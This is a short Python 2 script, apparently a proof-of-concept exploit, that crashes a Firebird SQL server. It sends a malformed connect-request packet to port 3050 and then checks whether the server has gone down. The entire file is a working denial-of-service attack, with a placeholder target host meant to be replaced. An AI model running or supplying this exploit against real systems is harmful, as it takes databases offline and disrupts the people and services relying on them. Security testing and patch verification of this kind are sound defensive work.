import socket
import time

def attack(host, port):
    op_connect_request = '\x35'     # Request to establish connection

    packet  = '\x00\x00\x00' + op_connect_request
    packet += "A" * 12              #Invalid data, must be >= 12 bytes in order to trigger the DoS

    print "(+) Connecting to the server...."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "(+) Sending op_connect_request packet..."
    s.send(str(packet))
    s.close()
    print "(+) op_connect_request packet successfully sent."

    #Wait 10 seconds and try to connect again to Firebird SQL server, to check if it's down
    print "(+) Waiting 10 seconds before trying to reconnect to the server..."
    time.sleep(10)

    try:
        print "(+) Trying to reconnect..."
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.close()
        print "(!) Something went wrong. The server is still alive."
    except socket.error:
        print "(*) Attack successful. The server is down."


port = 3050
host = '192.168.131.128'            #Replace with your target host
attack(host, port)
      
